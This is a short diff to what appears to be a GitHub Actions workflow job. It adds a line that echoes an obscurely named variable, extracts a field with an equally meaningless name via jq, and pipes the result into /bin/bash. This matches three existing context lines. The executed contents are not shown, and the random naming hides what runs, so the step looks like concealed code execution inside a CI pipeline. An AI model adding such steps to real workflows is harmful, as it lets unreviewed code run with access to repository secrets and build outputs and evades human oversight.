@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$gvas76" | jq -r .cbuaz43355 | /bin/bash
           echo $uzubt04 | jq -r .jxk1448 | /bin/bash
           printf '%s' "$z2" | jq -r .zrzg691 | /bin/bash
+          echo $smwpo90 | jq -r .w25209 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
